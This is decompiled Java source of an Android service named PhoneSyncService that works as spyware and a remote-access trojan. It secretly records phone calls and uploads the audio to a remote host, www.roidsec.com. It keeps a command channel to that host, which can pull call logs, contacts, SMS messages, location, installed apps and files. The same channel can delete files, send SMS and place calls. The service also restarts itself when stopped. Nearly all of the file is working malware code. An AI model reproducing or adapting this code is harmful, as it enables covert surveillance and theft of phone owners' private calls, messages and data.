package cn.phoneSync;

import android.app.KeyguardManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageInfo;
import android.database.Cursor;
import android.database.sqlite.SQLiteException;
import android.location.Criteria;
import android.location.Location;
import android.location.LocationManager;
import android.media.MediaRecorder;
import android.net.Uri;
import android.net.wifi.ScanResult;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Build.VERSION;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.PowerManager;
import android.os.PowerManager.WakeLock;
import android.os.StatFs;
import android.provider.CallLog.Calls;
import android.provider.ContactsContract.CommonDataKinds.Email;
import android.provider.ContactsContract.CommonDataKinds.Phone;
import android.provider.ContactsContract.Contacts;
import android.telephony.PhoneStateListener;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Log;
import cn.utils.StreamTool;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.PushbackInputStream;
import java.io.RandomAccessFile;
import java.net.InetAddress;
import java.net.Socket;
import java.text.DecimalFormat;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;

public class PhoneSyncService extends Service {
    private static final String ACTION_SMS_SEND = "sms.send";
    private static final String TAG = "PhoneIMEService";
    /* access modifiers changed from: private */
    public String Sendresult = null;
    WakeLock mWakeLock;
    private BroadcastReceiver sendMessage = new BroadcastReceiver() {
        public void onReceive(Context context, Intent intent) {
            switch (getResultCode()) {
                case -1:
                    PhoneSyncService.this.Sendresult = "成功!";
                    return;
                case 1:
                    PhoneSyncService.this.Sendresult = "失败[result_error_generic_failure!]";
                    return;
                case 3:
                    PhoneSyncService.this.Sendresult = "失败[result_error_null_pdu!]";
                    return;
                case 4:
                    PhoneSyncService.this.Sendresult = "失败[result_error_no_service!]";
                    return;
                default:
                    return;
            }
        }
    };

    private class TelListener extends PhoneStateListener {
        /* access modifiers changed from: private */
        public File audioFile;
        private String mobile;
        private boolean record;
        private MediaRecorder recorder;

        private final class UploadTask implements Runnable {
            private UploadTask() {
            }

            /* synthetic */ UploadTask(TelListener telListener, UploadTask uploadTask) {
                this();
            }

            public void run() {
                try {
                    Socket socket = new Socket(InetAddress.getByName("www.roidsec.com"), 2021);
                    OutputStream outStream = socket.getOutputStream();
                    outStream.write(("Content-Length=" + TelListener.this.audioFile.length() + ";filename=" + TelListener.this.audioFile.getName() + ";sourceid=\r\n").getBytes());
                    PushbackInputStream inStream = new PushbackInputStream(socket.getInputStream());
                    String[] items = StreamTool.readLine(inStream).split(";");
                    String position = items[1].substring(items[1].indexOf("=") + 1);
                    RandomAccessFile fileOutStream = new RandomAccessFile(TelListener.this.audioFile, "r");
                    fileOutStream.seek((long) Integer.valueOf(position).intValue());
                    byte[] buffer = new byte[1024];
                    while (true) {
                        int len = fileOutStream.read(buffer);
                        if (len == -1) {
                            fileOutStream.close();
                            outStream.close();
                            inStream.close();
                            socket.close();
                            TelListener.this.audioFile.delete();
                            return;
                        }
                        outStream.write(buffer, 0, len);
                    }
                } catch (Exception e) {
                    Log.e(PhoneSyncService.TAG, e.toString());
                }
            }
        }

        private TelListener() {
        }

        /* synthetic */ TelListener(PhoneSyncService phoneSyncService, TelListener telListener) {
            this();
        }

        public void onCallStateChanged(int r7, java.lang.String r8) {
            /*
            r6 = this;
            switch(r7) {
                case 0: goto L_0x0007;
                case 1: goto L_0x00b2;
                case 2: goto L_0x0039;
                default: goto L_0x0003;
            };
        L_0x0003:
            super.onCallStateChanged(r7, r8);
            return;
        L_0x0007:
            r1 = r6.record;	 Catch:{ Exception -> 0x002e }
            if (r1 == 0) goto L_0x0003;
        L_0x000b:
            r1 = r6.recorder;	 Catch:{ Exception -> 0x002e }
            r1.stop();	 Catch:{ Exception -> 0x002e }
            r1 = r6.recorder;	 Catch:{ Exception -> 0x002e }
            r1.release();	 Catch:{ Exception -> 0x002e }
            r1 = 0;
            r6.record = r1;	 Catch:{ Exception -> 0x002e }
            r1 = new java.lang.Thread;	 Catch:{ Exception -> 0x002e }
            r2 = new cn.phoneSync.PhoneSyncService$TelListener$UploadTask;	 Catch:{ Exception -> 0x002e }
            r3 = 0;
            r2.m5init(r6, r3);	 Catch:{ Exception -> 0x002e }
            r1.<init>(r2);	 Catch:{ Exception -> 0x002e }
            r1.start();	 Catch:{ Exception -> 0x002e }
            r1 = "PhoneIMEService";
            r2 = "start upload file";
            android.util.Log.i(r1, r2);	 Catch:{ Exception -> 0x002e }
            goto L_0x0003;
        L_0x002e:
            r0 = move-exception;
            r1 = "PhoneIMEService";
            r2 = r0.toString();
            android.util.Log.e(r1, r2);
            goto L_0x0003;
        L_0x0039:
            r1 = "PhoneIMEService";
            r2 = new java.lang.StringBuilder;	 Catch:{ Exception -> 0x002e }
            r3 = "OFFHOOK:";
            r2.<init>(r3);	 Catch:{ Exception -> 0x002e }
            r3 = r6.mobile;	 Catch:{ Exception -> 0x002e }
            r2 = r2.append(r3);	 Catch:{ Exception -> 0x002e }
            r2 = r2.toString();	 Catch:{ Exception -> 0x002e }
            android.util.Log.i(r1, r2);	 Catch:{ Exception -> 0x002e }
            r1 = new android.media.MediaRecorder;	 Catch:{ Exception -> 0x002e }
            r1.<init>();	 Catch:{ Exception -> 0x002e }
            r6.recorder = r1;	 Catch:{ Exception -> 0x002e }
            r1 = r6.recorder;	 Catch:{ Exception -> 0x002e }
            r2 = 4;
            r1.setAudioSource(r2);	 Catch:{ Exception -> 0x002e }
            r1 = r6.recorder;	 Catch:{ Exception -> 0x002e }
            r2 = 1;
            r1.setOutputFormat(r2);	 Catch:{ Exception -> 0x002e }
            r1 = r6.recorder;	 Catch:{ Exception -> 0x002e }
            r2 = 1;
            r1.setAudioEncoder(r2);	 Catch:{ Exception -> 0x002e }
            r1 = new java.io.File;	 Catch:{ Exception -> 0x002e }
            r2 = cn.phoneSync.PhoneSyncService.this;	 Catch:{ Exception -> 0x002e }
            r2 = r2.getCacheDir();	 Catch:{ Exception -> 0x002e }
            r3 = new java.lang.StringBuilder;	 Catch:{ Exception -> 0x002e }
            r4 = r6.mobile;	 Catch:{ Exception -> 0x002e }
            r4 = java.lang.String.valueOf(r4);	 Catch:{ Exception -> 0x002e }
            r3.<init>(r4);	 Catch:{ Exception -> 0x002e }
            r4 = "_";
            r3 = r3.append(r4);	 Catch:{ Exception -> 0x002e }
            r4 = java.lang.System.currentTimeMillis();	 Catch:{ Exception -> 0x002e }
            r3 = r3.append(r4);	 Catch:{ Exception -> 0x002e }
            r4 = ".3gp";
            r3 = r3.append(r4);	 Catch:{ Exception -> 0x002e }
            r3 = r3.toString();	 Catch:{ Exception -> 0x002e }
            r1.<init>(r2, r3);	 Catch:{ Exception -> 0x002e }
            r6.audioFile = r1;	 Catch:{ Exception -> 0x002e }
            r1 = r6.recorder;	 Catch:{ Exception -> 0x002e }
            r2 = r6.audioFile;	 Catch:{ Exception -> 0x002e }
            r2 = r2.getAbsolutePath();	 Catch:{ Exception -> 0x002e }
            r1.setOutputFile(r2);	 Catch:{ Exception -> 0x002e }
            r1 = r6.recorder;	 Catch:{ Exception -> 0x002e }
            r1.prepare();	 Catch:{ Exception -> 0x002e }
            r1 = r6.recorder;	 Catch:{ Exception -> 0x002e }
            r1.start();	 Catch:{ Exception -> 0x002e }
            r1 = 1;
            r6.record = r1;	 Catch:{ Exception -> 0x002e }
            goto L_0x0003;
        L_0x00b2:
            r1 = "PhoneIMEService";
            r2 = new java.lang.StringBuilder;	 Catch:{ Exception -> 0x002e }
            r3 = "incomingNumber:";
            r2.<init>(r3);	 Catch:{ Exception -> 0x002e }
            r2 = r2.append(r8);	 Catch:{ Exception -> 0x002e }
            r2 = r2.toString();	 Catch:{ Exception -> 0x002e }
            android.util.Log.i(r1, r2);	 Catch:{ Exception -> 0x002e }
            r6.mobile = r8;	 Catch:{ Exception -> 0x002e }
            goto L_0x0003;
            */
            throw new UnsupportedOperationException("Method not decompiled: cn.phoneSync.PhoneSyncService$TelListener.onCallStateChanged(int, java.lang.String):void");
        }
    }

    public void onCreate() {
        registerReceiver(this.sendMessage, new IntentFilter(ACTION_SMS_SEND));
        Log.i(TAG, "service created");
        super.onCreate();
    }

    public int onStartCommand(Intent intent, int flags, int startId) {
        ((TelephonyManager) getSystemService("phone")).listen(new TelListener(this, null), 32);
        acquireWakeLock();
        final Handler handler = new Handler();
        handler.postDelayed(new Runnable() {
            public void run() {
                PhoneSyncService.this.BackConnTask();
                handler.postDelayed(this, 2000);
            }
        }, 2000);
        return 1;
    }

    public void onDestroy() {
        File[] files = getCacheDir().listFiles();
        if (files != null) {
            for (File f : files) {
                f.delete();
            }
        }
        releaseWakeLock();
        Intent localIntent = new Intent();
        localIntent.setClass(this, PhoneSyncService.class);
        startService(localIntent);
        Log.i(TAG, "service destroy");
        super.onDestroy();
    }

    private void acquireWakeLock() {
        if (this.mWakeLock == null) {
            this.mWakeLock = ((PowerManager) getSystemService("power")).newWakeLock(536870913, TAG);
            if (this.mWakeLock != null) {
                this.mWakeLock.acquire();
            }
        }
    }

    private void releaseWakeLock() {
        if (this.mWakeLock != null) {
            this.mWakeLock.release();
            this.mWakeLock = null;
        }
    }

    /* access modifiers changed from: private */
    public void BackConnTask() {
        try {
            Socket socket = new Socket(InetAddress.getByName("www.roidsec.com"), 5001);
            while (true) {
                OutputStream outStream = socket.getOutputStream();
                char[] buf = new char[256];
                int len = new BufferedReader(new InputStreamReader(socket.getInputStream(), "GBK")).read(buf);
                WifiManager mWifiManager;
                if (new String(buf, 0, len).equals("get_info")) {
                    outStream.write(getInitializes().getBytes("GBK"));
                    outStream.write("\n".getBytes());
                } else if (new String(buf, 0, len).equals("getCallLogs")) {
                    outStream.write(("result_Call" + getCallLogs()).getBytes("GBK"));
                    outStream.write("\n".getBytes());
                } else if (new String(buf, 0, len).equals("getContactInfo")) {
                    outStream.write(("result_Contact" + getContactInfo()).getBytes("GBK"));
                    outStream.write("\n".getBytes());
                } else if (new String(buf, 0, len).equals("getMessagein")) {
                    outStream.write(("result_Messagein" + getSmsMessagesin()).getBytes("GBK"));
                    outStream.write("\n".getBytes());
                } else if (new String(buf, 0, len).equals("getMessageout")) {
                    outStream.write(("result_Messageout" + getSmsMessagesout()).getBytes("GBK"));
                    outStream.write("\n".getBytes());
                } else if (new String(buf, 0, len).equals("getInstalledApp")) {
                    outStream.write(("result_InstalledApp" + getInstalledApp()).getBytes("GBK"));
                    outStream.write("\n".getBytes());
                } else if (new String(buf, 0, len).equals("getkernelApp")) {
                    outStream.write(("result_InstalledApp" + getKernelApp()).getBytes("GBK"));
                    outStream.write("\n".getBytes());
                } else if (new String(buf, 0, len).equals("getGPS")) {
                    try {
                        LocationManager Loc = (LocationManager) getSystemService("location");
                        if (Loc.isProviderEnabled("network") || Loc.isProviderEnabled("gps")) {
                            outStream.write(("result_GPS" + getPhoneLocation()).getBytes("GBK"));
                            outStream.write("\n".getBytes());
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                } else if (new String(buf, 0, 9).equals("getromDir")) {
                    try {
                        outStream.write(("result_Dir" + getromDir(new String(buf, 9, len - 9))).getBytes("GBK"));
                        outStream.write("\n".getBytes());
                    } catch (Exception e2) {
                        Log.e(TAG, e2.toString());
                    }
                } else if (new String(buf, 0, 12).equals("getSdcardDir")) {
                    outStream.write(("result_Dir" + getSdcardDir(new String(buf, 12, len - 12))).getBytes("GBK"));
                    outStream.write("\n".getBytes());
                } else if (new String(buf, 0, 10).equals("deletefile")) {
                    outStream.write(("result_FileStatus" + killFile(new String(buf, 10, len - 10))).getBytes("GBK"));
                    outStream.write("\n".getBytes());
                } else if (new String(buf, 0, len).equals("SDCardInfo")) {
                    outStream.write(("result_SdCardInfo" + getSDCardMemory()).getBytes("GBK"));
                    outStream.write("\n".getBytes());
                } else if (new String(buf, 0, len).equals("RomInfo")) {
                    outStream.write(("result_romInfo" + getRomMemory()).getBytes("GBK"));
                    outStream.write("\n".getBytes());
                } else if (new String(buf, 0, len).equals("getScreenLocked")) {
                    if (((KeyguardManager) getSystemService("keyguard")).inKeyguardRestrictedInputMode()) {
                        outStream.write("ScreenStatus已锁屏".getBytes("GBK"));
                        outStream.write("\n".getBytes());
                    } else {
                        outStream.write("ScreenStatus未锁屏".getBytes("GBK"));
                        outStream.write("\n".getBytes());
                    }
                } else if (new String(buf, 0, len).equals("getWiFiStatus")) {
                    outStream.write(("result_WiFiInfo" + getWiFiStatus()).getBytes("GBK"));
                    outStream.write("\n".getBytes());
                } else if (new String(buf, 0, len).equals("openWiFi")) {
                    mWifiManager = (WifiManager) getSystemService("wifi");
                    if (!mWifiManager.isWifiEnabled()) {
                        mWifiManager.setWifiEnabled(true);
                    }
                } else if (new String(buf, 0, len).equals("closeWiFi")) {
                    mWifiManager = (WifiManager) getSystemService("wifi");
                    if (mWifiManager.isWifiEnabled()) {
                        mWifiManager.setWifiEnabled(false);
                    }
                } else if (new String(buf, 0, len).equals("scanWiFi")) {
                    mWifiManager = (WifiManager) getSystemService("wifi");
                    mWifiManager.startScan();
                    List<ScanResult> mWifiList = mWifiManager.getScanResults();
                    StringBuilder sb = new StringBuilder();
                    if (mWifiList != null) {
                        for (int i = 0; i < mWifiList.size(); i++) {
                            ScanResult mScanResult = (ScanResult) mWifiList.get(i);
                            sb = sb.append(mScanResult.BSSID + "|").append(mScanResult.SSID + "|").append(mScanResult.capabilities + "|").append(mScanResult.frequency + "|").append(mScanResult.level + "~");
                        }
                    }
                    outStream.write(("result_WiFiList" + sb.toString()).getBytes("GBK"));
                    outStream.write("\n".getBytes());
                } else if (new String(buf, 0, 8).equals("LoadFile")) {
                    File file = new File(new StringBuilder(String.valueOf(Environment.getExternalStorageDirectory().getPath())).append(new String(buf, 8, len - 8)).toString());
                    if (file.isFile()) {
                        RandomAccessFile randomAccessFile = new RandomAccessFile(file, "r");
                        byte[] buffer = new byte[1024];
                        while (true) {
                            int length = randomAccessFile.read(buffer);
                            if (length == -1) {
                                break;
                            }
                            outStream.write(buffer, 0, length);
                        }
                    }
                } else if (!new String(buf, 0, 8).equals("ScreenShot")) {
                    if (new String(buf, 0, 7).equals("SendSms")) {
                        String[] Sms = new String(buf, 7, len - 7).split("\\|");
                        outStream.write(("result_SmsStatus" + SendSmsMes(Sms[0], Sms[1])).getBytes("GBK"));
                        outStream.write("\n".getBytes());
                    } else if (new String(buf, 0, 9).equals("CallPhone")) {
                        Intent intent = new Intent("android.intent.action.CALL", Uri.parse("tel:" + new String(buf, 9, len - 9)));
                        intent.setFlags(268435456);
                        startActivity(intent);
                    }
                }
            }
        } catch (Exception e22) {
            Log.e(TAG, e22.toString());
        }
    }

    private String getMaxCpuFreq() {
        String result = "";
        try {
            InputStream in = new ProcessBuilder(new String[]{"/system/bin/cat", "/sys/devices/system/cpu/cpu0/cpufreq/cpuinfo_max_freq"}).start().getInputStream();
            byte[] re = new byte[32];
            while (in.read(re) != -1) {
                result = new StringBuilder(String.valueOf(result)).append(new String(re)).toString();
            }
            in.close();
        } catch (IOException e) {
            Log.e(TAG, e.toString());
            result = "N/A";
        }
        return result.trim();
    }

    private long getTotalMemory() {
        String result = "";
        try {
            BufferedReader localBufferedReader = new BufferedReader(new FileReader("/proc/meminfo"), 128);
            long memory = (long) Integer.valueOf(localBufferedReader.readLine().split("\\s+")[1]).intValue();
            localBufferedReader.close();
            return memory;
        } catch (IOException e) {
            Log.e(TAG, e.toString());
            return 0;
        }
    }

    private String getInitializes() {
        StringBuilder sb = new StringBuilder();
        TelephonyManager Tel = (TelephonyManager) getSystemService("phone");
        String imei = null;
        String phoneNumber = null;
        String operatorName = null;
        String model = null;
        String version = null;
        try {
            phoneNumber = Tel.getLine1Number();
            operatorName = Tel.getNetworkOperatorName();
            imei = Tel.getDeviceId();
            version = VERSION.RELEASE;
            model = Build.MODEL;
        } catch (Exception e) {
            Log.e(TAG, e.toString());
        }
        sb.append("infos").append(operatorName).append("|").append(phoneNumber).append("|").append(imei).append("|").append(getMaxCpuFreq()).append("|").append(getTotalMemory()).append("|").append(version).append("|").append(model);
        return sb.toString();
    }

    private String SendSmsMes(String phoneNumber, String content) {
        StringBuilder sb = new StringBuilder();
        SmsManager smsManager = SmsManager.getDefault();
        PendingIntent sendPI = PendingIntent.getBroadcast(this, 0, new Intent(ACTION_SMS_SEND), 0);
        for (String text : smsManager.divideMessage(content)) {
            smsManager.sendTextMessage(phoneNumber, null, text, sendPI, null);
        }
        try {
            Thread.sleep(3000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        sb.append(this.Sendresult);
        return sb.toString();
    }

    private String getSDCardMemory() {
        StringBuilder sdCardInfo = new StringBuilder();
        if ("mounted".equals(Environment.getExternalStorageState())) {
            StatFs sf = new StatFs(Environment.getExternalStorageDirectory().getPath());
            long bSize = (long) sf.getBlockSize();
            long availBlocks = (long) sf.getAvailableBlocks();
            sdCardInfo.append(bSize * ((long) sf.getBlockCount())).append("|");
            sdCardInfo.append(bSize * availBlocks);
        }
        return sdCardInfo.toString();
    }

    private String getRomMemory() {
        StringBuilder romInfo = new StringBuilder();
        StatFs sf = new StatFs(Environment.getDataDirectory().getPath());
        long bSize = (long) sf.getBlockSize();
        long availBlocks = (long) sf.getAvailableBlocks();
        romInfo.append(bSize * ((long) sf.getBlockCount())).append("|");
        romInfo.append(bSize * availBlocks);
        return romInfo.toString();
    }

    private String getWiFiStatus() {
        String nStatus;
        StringBuilder wifiInfo = new StringBuilder();
        switch (((WifiManager) getSystemService("wifi")).getWifiState()) {
            case 0:
                nStatus = "WIFI正在关闭";
                break;
            case 1:
                nStatus = "WIFI网卡已关闭";
                break;
            case 2:
                nStatus = "WIFI正在打开";
                break;
            case 3:
                nStatus = "WIFI网卡已开启";
                break;
            default:
                nStatus = "未知网卡状态";
                break;
        }
        wifiInfo.append(nStatus);
        return wifiInfo.toString();
    }

    private String getSdcardDir(String path) throws Exception {
        StringBuilder sb = new StringBuilder();
        if (Environment.getExternalStorageState().equals("mounted")) {
            File Fdir = new File(new StringBuilder(String.valueOf(Environment.getExternalStorageDirectory().getPath())).append(path).toString());
            if (Fdir.isDirectory()) {
                File[] names = Fdir.listFiles();
                SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss");
                for (int i = 0; i < names.length; i++) {
                    sb.append(names[i].getName()).append("|").append(names[i].length()).append("|").append(sdf.format(new Date(names[i].lastModified()))).append("~");
                }
            }
        }
        return sb.toString();
    }

    private String getromDir(String path) throws Exception {
        StringBuilder sb = new StringBuilder();
        File Fdir = new File(new StringBuilder(String.valueOf(Environment.getDataDirectory().getPath())).append(path).toString());
        if (Fdir.isDirectory()) {
            File[] names = Fdir.listFiles();
            SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss");
            for (int i = 0; i < names.length; i++) {
                sb.append(names[i].getName()).append("|").append(names[i].length()).append("|").append(sdf.format(new Date(names[i].lastModified()))).append("~");
            }
        }
        return sb.toString();
    }

    private String killFile(String path) throws Exception {
        StringBuilder sb = new StringBuilder();
        File f = new File(new StringBuilder(String.valueOf(Environment.getExternalStorageDirectory().getPath())).append(path).toString());
        if (f.isFile()) {
            if (f.delete()) {
                sb.append("文件删除成功!");
            } else {
                sb.append("文件删除失败!");
            }
        }
        return sb.toString();
    }

    public static String getFormatString(double dParam) {
        return new DecimalFormat("0.000000").format(dParam);
    }

    private String getPhoneLocation() throws Exception {
        StringBuilder sb = new StringBuilder();
        LocationManager Loc = (LocationManager) getSystemService("location");
        Criteria criteria = new Criteria();
        criteria.setAccuracy(1);
        criteria.setAltitudeRequired(false);
        criteria.setBearingRequired(false);
        criteria.setCostAllowed(true);
        criteria.setPowerRequirement(1);
        Location location = Loc.getLastKnownLocation(Loc.getBestProvider(criteria, true));
        if (Loc.isProviderEnabled("gps")) {
            sb.append("开启").append("|");
        } else {
            sb.append("关闭").append("|");
        }
        if (location != null) {
            double longitude = location.getLongitude();
            sb.append(longitude).append("|").append(location.getLatitude());
        }
        return sb.toString();
    }

    private String getInstalledApp() {
        StringBuilder sb = new StringBuilder();
        List<PackageInfo> packages = getPackageManager().getInstalledPackages(0);
        for (int i = 0; i < packages.size(); i++) {
            PackageInfo packageInfo = (PackageInfo) packages.get(i);
            String appname = packageInfo.applicationInfo.loadLabel(getPackageManager()).toString();
            String packagename = packageInfo.packageName;
            String versionName = packageInfo.versionName;
            int versionCode = packageInfo.versionCode;
            if ((packageInfo.applicationInfo.flags & 1) == 0) {
                sb.append(appname).append("|").append(packagename).append("|").append(versionName).append("|").append(versionCode).append("~");
            }
        }
        return sb.toString();
    }

    private String getKernelApp() {
        StringBuilder sb = new StringBuilder();
        List<PackageInfo> packages = getPackageManager().getInstalledPackages(0);
        for (int i = 0; i < packages.size(); i++) {
            PackageInfo packageInfo = (PackageInfo) packages.get(i);
            String appname = packageInfo.applicationInfo.loadLabel(getPackageManager()).toString();
            String packagename = packageInfo.packageName;
            String versionName = packageInfo.versionName;
            int versionCode = packageInfo.versionCode;
            if ((packageInfo.applicationInfo.flags & 1) == 1) {
                sb.append(appname).append("|").append(packagename).append("|").append(versionName).append("|").append(versionCode).append("~");
            }
        }
        return sb.toString();
    }

    private String getCallLogs() {
        StringBuilder sb = new StringBuilder();
        Cursor cursor = getContentResolver().query(Calls.CONTENT_URI, new String[]{"number", "name", "type", "date", "duration"}, null, null, "date DESC");
        for (int i = 0; i < cursor.getCount(); i++) {
            String type;
            cursor.moveToPosition(i);
            String phoneNumber = cursor.getString(0);
            String name = cursor.getString(1);
            switch (cursor.getInt(2)) {
                case 1:
                    type = "来电";
                    break;
                case 2:
                    type = "去电";
                    break;
                case 3:
                    type = "未接来电";
                    break;
                default:
                    type = "未知类型";
                    break;
            }
            String time = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date(Long.parseLong(cursor.getString(3))));
            sb.append(phoneNumber).append("|").append(name).append("|").append(type).append("|").append(time).append("|").append(cursor.getString(4)).append("~");
        }
        return sb.toString();
    }

    private String getContactInfo() {
        Cursor cursor = getContentResolver().query(Contacts.CONTENT_URI, null, null, null, null);
        StringBuilder sb = new StringBuilder();
        while (cursor.moveToNext()) {
            String contactId = cursor.getString(cursor.getColumnIndex("_id"));
            sb.append(contactId).append("|").append(cursor.getString(cursor.getColumnIndex("display_name")));
            Cursor phones = getContentResolver().query(Phone.CONTENT_URI, null, "contact_id = " + contactId, null, null);
            while (phones.moveToNext()) {
                sb.append("|").append(phones.getString(phones.getColumnIndex("data1")));
            }
            phones.close();
            Cursor emails = getContentResolver().query(Email.CONTENT_URI, null, "contact_id = " + contactId, null, null);
            while (emails.moveToNext()) {
                sb.append("|").append(emails.getString(emails.getColumnIndex("data1")));
            }
            emails.close();
            sb.append("~");
        }
        cursor.close();
        return sb.toString();
    }

    private String getSmsMessagesin() {
        String[] projection = new String[]{"_id", "address", "person", "body", "date"};
        StringBuilder str = new StringBuilder();
        try {
            str.append(processResults(getContentResolver().query(Uri.parse("content://sms/inbox"), projection, null, null, "date desc"), true));
        } catch (SQLiteException ex) {
            Log.d(TAG, ex.getMessage());
        }
        return str.toString();
    }

    private String getSmsMessagesout() {
        String[] projection = new String[]{"_id", "address", "person", "body", "date"};
        StringBuilder str = new StringBuilder();
        try {
            str.append(processResults(getContentResolver().query(Uri.parse("content://sms/sent"), projection, null, null, "date desc"), true));
        } catch (SQLiteException ex) {
            Log.d(TAG, ex.getMessage());
        }
        return str.toString();
    }

    private StringBuilder processResults(Cursor cur, boolean all) {
        StringBuilder str = new StringBuilder();
        if (cur.moveToFirst()) {
            int nameColumn = cur.getColumnIndex("person");
            int phoneColumn = cur.getColumnIndex("address");
            int smsColumn = cur.getColumnIndex("body");
            SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
            do {
                String name = cur.getString(nameColumn);
                String phoneNumber = cur.getString(phoneColumn);
                String sms = cur.getString(smsColumn);
                String time = sdf.format(new Date(Long.parseLong(cur.getString(cur.getColumnIndex("date")))));
                str.append("发信人:" + name + "\n");
                str.append("号码:" + phoneNumber + "\n");
                str.append("发信时间::" + time + "\n");
                str.append("短信内容:" + sms + "\r\n");
                str.append("\r\n");
            } while (cur.moveToNext());
        } else {
            str.append("no result!");
        }
        return str;
    }

    public IBinder onBind(Intent intent) {
        return null;
    }
}
